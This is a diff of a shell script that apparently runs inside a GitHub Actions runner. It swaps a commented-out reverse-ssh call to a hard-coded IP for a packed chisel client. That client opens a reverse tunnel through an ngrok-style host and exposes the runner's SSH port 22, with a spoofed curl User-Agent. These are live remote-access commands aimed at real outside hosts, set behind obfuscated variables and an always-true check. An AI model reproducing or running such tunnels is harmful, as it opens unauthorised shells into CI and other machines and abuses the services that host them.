@@ -31,10 +31,10 @@ if [ ! -z ${port5} ] && [ ! -z ${ip5} ] && [ "714" == "714"  ]; then
   num76=$((${num67z}%8));
   bport2=5005"$num76";
 
-  export bport2=$bport2
-  export GITHUB_WORKSPACE=/home/runner/work/arm64/arm64
-  $GITHUB_WORKSPACE/upx_reverse-ssh-armv7-x86 -v -b $bport2 -p 30022 118.31.229.160 
-  #$GITHUB_WORKSPACE/chisel2upx.elf client -v --header 'User-Agent: curl/8.12.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport2:127.0.0.1:22;
+  export bport2=$bport2 ;
+  export GITHUB_WORKSPACE=/home/runner/work/arm64/arm64 ;
+  # $GITHUB_WORKSPACE/upx_reverse-ssh-armv7-x86 -v -b $bport2 -p 30022 118.31.229.160 
+  $GITHUB_WORKSPACE/chisel2arm64upx.elf client -v --header 'User-Agent: curl/8.12.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport2:127.0.0.1:22;
   echo $?;
 
 
